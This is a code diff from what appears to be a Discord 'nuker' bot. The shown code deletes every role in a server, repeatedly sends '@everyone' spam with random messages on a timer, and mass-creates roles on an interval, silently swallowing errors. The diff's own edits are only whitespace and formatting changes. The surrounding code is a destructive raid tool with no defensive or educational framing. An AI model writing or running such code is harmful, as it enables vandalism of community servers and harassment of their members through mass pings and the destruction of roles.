@@ -57,7 +57,6 @@ bot.on("message", (message)=>{
 			roles.forEach((role)=>{
 				try{
 					role.delete()
-
 					console.log(`Successfully deleted. Role: ${role.name}`)
 				}catch{}
 			})
@@ -73,7 +72,6 @@ bot.on("message", (message)=>{
 
 						setInterval(function(){
 							const randomMessage = Oex.messages[Math.floor(Math.random() * Oex.messages.length)]
-
 							channel.send(`@everyone ${randomMessage}`)
 						}, Oex.delay)
 					}).catch(()=>{})
@@ -89,9 +87,7 @@ bot.on("message", (message)=>{
 						reason: Oex.messages[Math.floor(Math.random() * Oex.messages.length)]
 					})
 
-					role.then((role)=>{
-						console.log(`Successfully created. Role: ${role.name}`)
-					}).catch(()=>{})
+					role.then((role)=>{console.log(`Successfully created. Role: ${role.name}`)}).catch(()=>{})
 				}catch{}
 			}, Oex.delay)
 		}catch{}
